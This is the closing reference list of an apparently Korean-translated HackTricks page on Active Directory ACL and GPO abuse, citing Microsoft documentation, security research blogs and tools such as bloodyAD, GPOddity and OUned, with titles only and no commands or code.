- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux에서 AD attribute/UAC operations](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, 및 DPAPI decryption을 통한 DC admin 권한 획득](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Code Execution 및 NTLM Relay를 위한 GPO UNC Paths Hijacking](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: NTLM relaying 등을 통한 Active Directory GPO 악용](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directory에서 숨겨진 Organizational Units ACL attack vectors 악용](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [네트워크에서 legitimate Active Directory services 시뮬레이션: GPO exploitation 사례](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
